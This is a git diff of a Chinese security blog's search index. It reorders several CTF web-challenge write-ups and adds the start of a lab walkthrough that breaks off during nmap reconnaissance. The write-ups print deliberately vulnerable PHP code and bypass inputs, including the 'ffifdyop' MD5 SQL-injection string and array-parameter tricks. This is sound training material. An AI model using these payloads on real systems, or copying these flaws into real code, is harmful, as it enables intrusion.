@@ -143,40 +143,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ACTF2020新生赛BackupFile</title>
-    <url>/2021/03/16/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/</url>
-    <content><![CDATA[<h1 id="ACTF2020新生赛BackupFile"><a href="#ACTF2020新生赛BackupFile" class="headerlink" title="ACTF2020新生赛BackupFile"></a>ACTF2020新生赛BackupFile</h1><p>​    菜鸡的日常练习</p>
-<a id="more"></a>
-
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
-<ul>
-<li>源码泄露</li>
-<li><code>php</code>弱类型比较</li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>登录首页</li>
-</ul>
-<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/1.png" alt></p>
-<ul>
-<li>提示源码泄露<code>index.php.bak</code></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>弱类型比较</li>
-</ul>
-<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/2.png" alt></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>buuoj</category>
-      </categories>
-      <tags>
-        <tag>源码泄露</tag>
-        <tag>php弱类型比较</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ACTF2020新生赛Exec</title>
     <url>/2021/02/01/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BExec/</url>
     <content><![CDATA[<h1 id="ACTF2020新生赛Exec"><a href="#ACTF2020新生赛Exec" class="headerlink" title="ACTF2020新生赛Exec"></a>ACTF2020新生赛Exec</h1><p>​    菜鸡的日常练习</p>
@@ -248,6 +214,40 @@
       </tags>
   </entry>
   <entry>
+    <title>ACTF2020新生赛BackupFile</title>
+    <url>/2021/03/17/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/</url>
+    <content><![CDATA[<h1 id="ACTF2020新生赛BackupFile"><a href="#ACTF2020新生赛BackupFile" class="headerlink" title="ACTF2020新生赛BackupFile"></a>ACTF2020新生赛BackupFile</h1><p>​    菜鸡的日常练习</p>
+<a id="more"></a>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
+<ul>
+<li>源码泄露</li>
+<li><code>php</code>弱类型比较</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>登录首页</li>
+</ul>
+<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/1.png" alt></p>
+<ul>
+<li>提示源码泄露<code>index.php.bak</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>弱类型比较</li>
+</ul>
+<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/2.png" alt></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>buuoj</category>
+      </categories>
+      <tags>
+        <tag>源码泄露</tag>
+        <tag>php弱类型比较</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ACTF2020新生赛Upload</title>
     <url>/2021/01/26/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/</url>
     <content><![CDATA[<h1 id="ACTF2020新生赛Upload"><a href="#ACTF2020新生赛Upload" class="headerlink" title="ACTF2020新生赛Upload"></a>ACTF2020新生赛Upload</h1><p>​    菜鸡的日常练习</p>
@@ -282,125 +282,6 @@
       </categories>
       <tags>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ASIS2019Unicornshop</title>
-    <url>/2021/02/03/blog_formal/security/CTF/ASIS2019Unicornshop/</url>
-    <content><![CDATA[<h1 id="ASIS2019Unicornshop"><a href="#ASIS2019Unicornshop" class="headerlink" title="ASIS2019Unicornshop"></a>ASIS2019Unicornshop</h1><p>​    菜鸡的日常练习</p>
-<a id="more"></a>
-
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
-<ul>
-<li><code>unicode</code></li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>登录首页</li>
-</ul>
-<p><img data-src="./ASIS2019Unicornshop/1.png" alt></p>
-<p><img data-src="./ASIS2019Unicornshop/2.png" alt></p>
-<ul>
-<li>前三个商品发现</li>
-</ul>
-<p><img data-src="./ASIS2019Unicornshop/3.png" alt></p>
-<ul>
-<li>第四个商品发现</li>
-</ul>
-<p><img data-src="./ASIS2019Unicornshop/4.png" alt></p>
-<p>题目提示<code>unicode</code></p>
-<ul>
-<li>查找值大于<code>1337</code>的<code>unicode</code>字符</li>
-</ul>
-<p><a href="https://www.compart.com/en/unicode/search?q=thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=thousand#characters</a></p>
-<p><img data-src="./ASIS2019Unicornshop/5.png" alt></p>
-<p><img data-src="./ASIS2019Unicornshop/6.png" alt></p>
-<p><img data-src="./ASIS2019Unicornshop/7.png" alt></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>buuoj</category>
-      </categories>
-      <tags>
-        <tag>unicode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020EasyMD5</title>
-    <url>/2021/02/02/blog_formal/security/CTF/BJDCTF2020EasyMD5/</url>
-    <content><![CDATA[<h1 id="BJDCTF2020EasyMD5"><a href="#BJDCTF2020EasyMD5" class="headerlink" title="BJDCTF2020EasyMD5"></a>BJDCTF2020EasyMD5</h1><p>​    菜鸡的日常练习</p>
-<a id="more"></a>
-
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
-<ul>
-<li><code>MD5</code>绕过</li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>登录首页</li>
-</ul>
-<p><img data-src="./BJDCTF2020EasyMD5/1.png" alt></p>
-<p><img data-src="./BJDCTF2020EasyMD5/2.png" alt></p>
-<ul>
-<li><code>ffifdyop</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">md5(ffifdyop) = 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	// 276f722736c95d99e921722cf9ed621c</span><br><span class="line">	var_dump(hex2bin("276f722736c95d99e921722cf9ed621c"));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">string(16) "'or'6É]™é!r,ùíb"</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./BJDCTF2020EasyMD5/3.png" alt></p>
-<p>绕过<code>&quot;select * from &#39;admin&#39; where password=&#39; &quot;.md5($pass,true).&quot; &#39; &quot;</code></p>
-<ul>
-<li><code>a[]=1&amp;b[]=1</code></li>
-</ul>
-<p><img data-src="./BJDCTF2020EasyMD5/4.png" alt></p>
-<p><img data-src="./BJDCTF2020EasyMD5/5.png" alt></p>
-<ul>
-<li>拿到<code>flag</code></li>
-</ul>
-<p><img data-src="./BJDCTF2020EasyMD5/6.png" alt></p>
-<p><img data-src="./BJDCTF2020EasyMD5/7.png" alt></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>buuoj</category>
-      </categories>
-      <tags>
-        <tag>MD5绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020Marklovescat</title>
-    <url>/2021/02/26/blog_formal/security/CTF/BJDCTF2020Marklovescat/</url>
-    <content><![CDATA[<h1 id="BJDCTF2020Marklovescat"><a href="#BJDCTF2020Marklovescat" class="headerlink" title="BJDCTF2020Marklovescat"></a>BJDCTF2020Marklovescat</h1><p>​    菜鸡的日常练习</p>
-<a id="more"></a>
-
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
-<ul>
-<li><code>.git</code>泄露</li>
-<li><code>php</code>变量覆盖</li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>登录首页</li>
-</ul>
-<p><img data-src="./BJDCTF2020Marklovescat/1.png" alt></p>
-<ul>
-<li><code>.git</code>泄露</li>
-</ul>
-<p><img data-src="./BJDCTF2020Marklovescat/2.png" alt></p>
-<ul>
-<li><code>githack</code>获取源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>突破</li>
-</ul>
-<p><img data-src="./BJDCTF2020Marklovescat/3.png" alt></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>buuoj</category>
-      </categories>
-      <tags>
-        <tag>.git泄露</tag>
-        <tag>php变量覆盖</tag>
       </tags>
   </entry>
   <entry>
@@ -748,6 +629,125 @@
       <tags>
         <tag>文件包含</tag>
         <tag>哈希扩展攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ASIS2019Unicornshop</title>
+    <url>/2021/02/03/blog_formal/security/CTF/ASIS2019Unicornshop/</url>
+    <content><![CDATA[<h1 id="ASIS2019Unicornshop"><a href="#ASIS2019Unicornshop" class="headerlink" title="ASIS2019Unicornshop"></a>ASIS2019Unicornshop</h1><p>​    菜鸡的日常练习</p>
+<a id="more"></a>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
+<ul>
+<li><code>unicode</code></li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>登录首页</li>
+</ul>
+<p><img data-src="./ASIS2019Unicornshop/1.png" alt></p>
+<p><img data-src="./ASIS2019Unicornshop/2.png" alt></p>
+<ul>
+<li>前三个商品发现</li>
+</ul>
+<p><img data-src="./ASIS2019Unicornshop/3.png" alt></p>
+<ul>
+<li>第四个商品发现</li>
+</ul>
+<p><img data-src="./ASIS2019Unicornshop/4.png" alt></p>
+<p>题目提示<code>unicode</code></p>
+<ul>
+<li>查找值大于<code>1337</code>的<code>unicode</code>字符</li>
+</ul>
+<p><a href="https://www.compart.com/en/unicode/search?q=thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=thousand#characters</a></p>
+<p><img data-src="./ASIS2019Unicornshop/5.png" alt></p>
+<p><img data-src="./ASIS2019Unicornshop/6.png" alt></p>
+<p><img data-src="./ASIS2019Unicornshop/7.png" alt></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>buuoj</category>
+      </categories>
+      <tags>
+        <tag>unicode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020EasyMD5</title>
+    <url>/2021/02/02/blog_formal/security/CTF/BJDCTF2020EasyMD5/</url>
+    <content><![CDATA[<h1 id="BJDCTF2020EasyMD5"><a href="#BJDCTF2020EasyMD5" class="headerlink" title="BJDCTF2020EasyMD5"></a>BJDCTF2020EasyMD5</h1><p>​    菜鸡的日常练习</p>
+<a id="more"></a>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
+<ul>
+<li><code>MD5</code>绕过</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>登录首页</li>
+</ul>
+<p><img data-src="./BJDCTF2020EasyMD5/1.png" alt></p>
+<p><img data-src="./BJDCTF2020EasyMD5/2.png" alt></p>
+<ul>
+<li><code>ffifdyop</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">md5(ffifdyop) = 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	// 276f722736c95d99e921722cf9ed621c</span><br><span class="line">	var_dump(hex2bin("276f722736c95d99e921722cf9ed621c"));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">string(16) "'or'6É]™é!r,ùíb"</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./BJDCTF2020EasyMD5/3.png" alt></p>
+<p>绕过<code>&quot;select * from &#39;admin&#39; where password=&#39; &quot;.md5($pass,true).&quot; &#39; &quot;</code></p>
+<ul>
+<li><code>a[]=1&amp;b[]=1</code></li>
+</ul>
+<p><img data-src="./BJDCTF2020EasyMD5/4.png" alt></p>
+<p><img data-src="./BJDCTF2020EasyMD5/5.png" alt></p>
+<ul>
+<li>拿到<code>flag</code></li>
+</ul>
+<p><img data-src="./BJDCTF2020EasyMD5/6.png" alt></p>
+<p><img data-src="./BJDCTF2020EasyMD5/7.png" alt></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>buuoj</category>
+      </categories>
+      <tags>
+        <tag>MD5绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020Marklovescat</title>
+    <url>/2021/02/26/blog_formal/security/CTF/BJDCTF2020Marklovescat/</url>
+    <content><![CDATA[<h1 id="BJDCTF2020Marklovescat"><a href="#BJDCTF2020Marklovescat" class="headerlink" title="BJDCTF2020Marklovescat"></a>BJDCTF2020Marklovescat</h1><p>​    菜鸡的日常练习</p>
+<a id="more"></a>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
+<ul>
+<li><code>.git</code>泄露</li>
+<li><code>php</code>变量覆盖</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>登录首页</li>
+</ul>
+<p><img data-src="./BJDCTF2020Marklovescat/1.png" alt></p>
+<ul>
+<li><code>.git</code>泄露</li>
+</ul>
+<p><img data-src="./BJDCTF2020Marklovescat/2.png" alt></p>
+<ul>
+<li><code>githack</code>获取源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>突破</li>
+</ul>
+<p><img data-src="./BJDCTF2020Marklovescat/3.png" alt></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>buuoj</category>
+      </categories>
+      <tags>
+        <tag>.git泄露</tag>
+        <tag>php变量覆盖</tag>
       </tags>
   </entry>
   <entry>
@@ -1361,7 +1361,7 @@
   </entry>
   <entry>
     <title>MRCTF2020PYWebsite</title>
-    <url>/2021/03/12/blog_formal/security/CTF/MRCTF2020PYWebsite/</url>
+    <url>/2021/03/13/blog_formal/security/CTF/MRCTF2020PYWebsite/</url>
     <content><![CDATA[<h1 id="MRCTF2020PYWebsite"><a href="#MRCTF2020PYWebsite" class="headerlink" title="MRCTF2020PYWebsite"></a>MRCTF2020PYWebsite</h1><p>​    菜鸡的日常练习</p>
 <a id="more"></a>
 
@@ -1708,7 +1708,7 @@
   </entry>
   <entry>
     <title>ZJCTF2019NiZhuanSiWei</title>
-    <url>/2021/03/19/blog_formal/security/CTF/ZJCTF2019NiZhuanSiWei/</url>
+    <url>/2021/03/20/blog_formal/security/CTF/ZJCTF2019NiZhuanSiWei/</url>
     <content><![CDATA[<h1 id="ZJCTF2019NiZhuanSiWei"><a href="#ZJCTF2019NiZhuanSiWei" class="headerlink" title="ZJCTF2019NiZhuanSiWei"></a>ZJCTF2019NiZhuanSiWei</h1><p>​    菜鸡的日常练习</p>
 <a id="more"></a>
 
@@ -2436,7 +2436,7 @@
   </entry>
   <entry>
     <title>网鼎杯2018Fakebook</title>
-    <url>/2021/02/04/blog_formal/security/CTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/</url>
+    <url>/2021/02/05/blog_formal/security/CTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/</url>
     <content><![CDATA[<h1 id="网鼎杯2018Fakebook"><a href="#网鼎杯2018Fakebook" class="headerlink" title="网鼎杯2018Fakebook"></a>网鼎杯2018Fakebook</h1><p>​    菜鸡的日常练习</p>
 <a id="more"></a>
 
@@ -5555,7 +5555,7 @@
   </entry>
   <entry>
     <title>支付漏洞入门</title>
-    <url>/2020/11/02/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</url>
+    <url>/2020/11/03/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h1 id="支付漏洞入门"><a href="#支付漏洞入门" class="headerlink" title="支付漏洞入门"></a>支付漏洞入门</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    支付漏洞的理解通常都是篡改价格、数量、user_id等前端传参，从而造成小钱够买大物，本质上是一种逻辑漏洞。比如，一分钱买任何东西。少收款、企业收费产品被免费使用，直接造成企业的经济损失，漏洞危害较大。</p>
 <p>​    由于是逻辑漏洞，需要攻击者多一些发散思维，想出开发没能够想到的思维漏洞点，不走寻常路，达到事半功倍的效果</p>
 <a id="more"></a>
@@ -10343,7 +10343,7 @@ git pull
   </entry>
   <entry>
     <title>Funbox11</title>
-    <url>/2021/08/08/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox11/</url>
+    <url>/2021/08/09/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox11/</url>
     <content><![CDATA[<h1 id="Funbox11"><a href="#Funbox11" class="headerlink" title="Funbox11"></a>Funbox11</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
 <a id="more"></a>
 
@@ -12646,7 +12646,7 @@ git pull
   </entry>
   <entry>
     <title>Thales</title>
-    <url>/2023/03/26/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Thales/</url>
+    <url>/2023/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Thales/</url>
     <content><![CDATA[<h1 id="Thales"><a href="#Thales" class="headerlink" title="Thales"></a>Thales</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
 <a id="more"></a>
 
@@ -14112,7 +14112,7 @@ git pull
   </entry>
   <entry>
     <title>hackme2</title>
-    <url>/2021/01/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hackme2/</url>
+    <url>/2021/01/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hackme2/</url>
     <content><![CDATA[<h1 id="hackme2"><a href="#hackme2" class="headerlink" title="hackme2"></a>hackme2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
 <a id="more"></a>
 
@@ -14872,6 +14872,84 @@ git pull
       </tags>
   </entry>
   <entry>
+    <title>hacksudo3</title>
+    <url>/2021/04/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo3/</url>
+    <content><![CDATA[<h1 id="hacksudo3"><a href="#hacksudo3" class="headerlink" title="hacksudo3"></a>hacksudo3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>hacksudo3</li>
+<li>windows10</li>
+</ul>
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/log# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.141   08:00:27:b3:dc:c3       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.160   68:07:15:e5:9f:39       Intel Corporate</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.943 seconds (131.76 hosts/sec). 7 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.4.141</code></li>
+<li><code>NMAP</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/var/log# nmap -sV -A -p 1-65535 192.168.4.141</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 04:49 EDT</span><br><span class="line">Nmap scan report for hacksudo.lan (192.168.4.141)</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Link Lock - Password-protect links</span><br><span class="line">MAC Address: 08:00:27:B3:DC:C3 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/23%OT=80%CT=1%CU=30567%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60828A16%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%</span><br><span class="line">OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5</span><br><span class="line">OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=</span><br><span class="line">OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%</span><br><span 